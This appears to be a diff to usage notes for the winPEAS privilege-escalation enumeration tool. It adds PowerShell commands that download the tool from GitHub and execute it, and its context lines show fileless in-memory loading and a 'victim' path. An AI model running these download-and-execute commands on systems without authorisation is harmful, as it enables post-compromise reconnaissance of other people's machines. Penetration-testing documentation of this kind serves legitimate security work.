@@ -22,9 +22,14 @@ $url = "https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany
 # One liner to download and execute winPEASany from memory in a PS shell
 $wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "$url" -UseBasicParsing | Select-Object -ExpandProperty Content)); [winPEAS.Program]::Main("")
 
-# Before cmd in 3 lines
+# The cprevios cmd in 2 lines
 $wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "$url" -UseBasicParsing | Select-Object -ExpandProperty Content));
 [winPEAS.Program]::Main("") #Put inside the quotes the winpeas parameters you want to use
+
+# Download to disk and execute (super noisy)
+$wc = New-Object System.Net.WebClient
+$wc.DownloadFile("https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany_ofs.exe", "winPEASany_ofs.exe")
+.\winPEASany_ofs.exe
 
 # Load from disk in memory and execute:
 $wp = [System.Reflection.Assembly]::Load([byte[]]([IO.File]::ReadAllBytes("D:\Users\victim\winPEAS.exe")));
